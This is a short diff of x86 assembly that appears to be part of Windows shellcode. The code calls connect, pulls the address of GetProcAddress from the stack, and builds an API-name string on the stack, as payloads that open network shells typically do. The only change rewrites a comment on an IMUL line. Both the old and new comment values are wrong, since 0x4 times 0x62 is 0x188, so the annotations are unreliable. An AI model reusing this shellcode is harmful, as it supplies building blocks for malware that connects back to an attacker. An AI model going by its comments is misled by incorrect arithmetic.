@@ -183,7 +183,7 @@ CALL EAX                             ;execute connect;
 ADD  ESP, 0x14                       ;Clean stack
 XOR  EBX, EBX                        ;zero out EBX
 ADD  BL, 0x4                         ;add 0x4 to lower register BL
-IMUL EBX, 0x62                       ;EBX = 0x194
+IMUL EBX, 0x62                       ;EBX = 0x190
 MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
 PUSH 0x61614173                      ;"aaAs"
 SUB  dword [ESP + 0x2], 0x6161	     ;"As"
